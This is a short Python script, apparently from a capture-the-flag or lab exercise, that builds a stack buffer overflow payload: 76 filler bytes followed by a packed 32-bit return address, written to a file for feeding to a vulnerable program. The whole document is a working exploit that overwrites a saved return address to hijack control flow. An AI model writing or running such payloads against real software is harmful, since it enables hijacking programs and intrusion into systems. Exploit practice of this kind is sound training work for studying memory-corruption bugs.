import struct

offset = 76
return_address = 0x80491d5

the_payload = (b"A"*offset) + struct.pack("<I", return_address)

with open("payload_func", "wb") as f:
    f.write(the_payload)
